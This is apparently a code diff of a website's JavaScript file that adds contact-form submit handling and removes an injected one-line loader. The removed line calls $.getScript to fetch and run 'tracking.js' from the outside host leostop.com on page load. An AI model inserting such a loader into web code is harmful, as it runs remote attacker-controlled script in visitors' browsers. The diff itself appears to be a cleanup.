@@ -72,8 +72,6 @@ $(function () {
 			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
 		});
     });
-	
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
 
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -105,3 +103,19 @@ function openNav() {
 function closeNav() {
   document.getElementById("mySidepanel").style.width = "0";
 }
+
+document.addEventListener("DOMContentLoaded", function()
+{
+	const submitButton = document.getElementById("submitContact");
+	const buttonContent = document.getElementById("buttonContent");
+	const loadingIcon = document.querySelector(".loading-icon");
+	const form = document.querySelector('form[name="contact_form"]');
+
+	submitButton.addEventListener("click", function(event)
+	{
+		loadingIcon.style.display = "inline";
+		buttonContent.style.display = "none";
+		submitButton.disabled = true;
+		form.submit();
+	});
+});
